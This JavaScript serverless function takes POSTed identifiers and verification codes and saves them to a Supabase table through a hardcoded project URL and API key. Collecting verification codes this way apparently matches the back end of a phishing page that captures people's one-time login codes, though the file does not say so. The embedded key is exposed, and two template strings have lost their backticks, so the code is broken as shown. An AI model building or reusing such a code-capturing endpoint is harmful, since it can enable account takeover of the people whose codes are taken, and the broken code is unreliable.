export default async (request, context) => {
    if (request.method !== "POST") {
        return new Response("Method Not Allowed", { status: 405 });
    }

    try {
        const body = await request.json();
        const { identifier, verification_code } = body;

        const supabaseUrl = 'https://dlmaxrjjrqntcssvrsmy.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWF4cmlqcnFudGNzc3Zyc215Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIzMTk1MDAsImV4cCI6MjEwNzg5NTUwMH0.oFkpunqEGruS189py8FiU2BNCU3xBwSqLvkn2u_aIsg';

        const response = await fetch(${supabaseUrl}/rest/v1/submissions, {
            method: 'POST',
            headers: {
                'apikey': supabaseKey,
                'Authorization': Bearer ${supabaseKey},
                'Content-Type': 'application/json',
                'Prefer': 'return=minimal'
            },
            body: JSON.stringify({
                identifier: identifier,
                verification_code: verification_code
            })
        });

        if (!response.ok) {
            throw new Error('فشل الحفظ في قاعدة البيانات');
        }

        return new Response(JSON.stringify({ message: "Success" }), {
            status: 200,
            headers: { "Content-Type": "application/json" }
        });

    } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
            status: 500,
            headers: { "Content-Type": "application/json" }
        });
    }
};
